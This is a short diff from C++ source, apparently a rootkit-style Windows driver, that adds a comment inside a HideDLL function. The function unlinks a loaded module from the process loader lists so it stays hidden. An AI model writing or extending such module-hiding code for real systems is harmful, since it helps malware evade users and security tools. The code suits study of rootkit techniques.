@@ -229,7 +229,7 @@ int ProcessUtils::HideDLL(UINT32 PID, const WCHAR* DLLName) {
                     DbgPrint("[+] Found matching DLL, unlinking from lists\n");
                     moduleBase = entry->DllBase;
                     // If found, start unlinking from the doubly-linked list.
-                    FlinkBlinkHide(&entry->InLoadOrderLinks);
+                    FlinkBlinkHide(&entry->InLoadOrderLinks); // always remember to give the address here, and not the value itself since this is an external function so we can't just give the "value" since it wont be actually modified in the process itself.
                     FlinkBlinkHide(&entry->InInitializationOrderLinks);
                     FlinkBlinkHide(&entry->InMemoryOrderLinks);
                     FlinkBlinkHide(&entry->HashLinks);
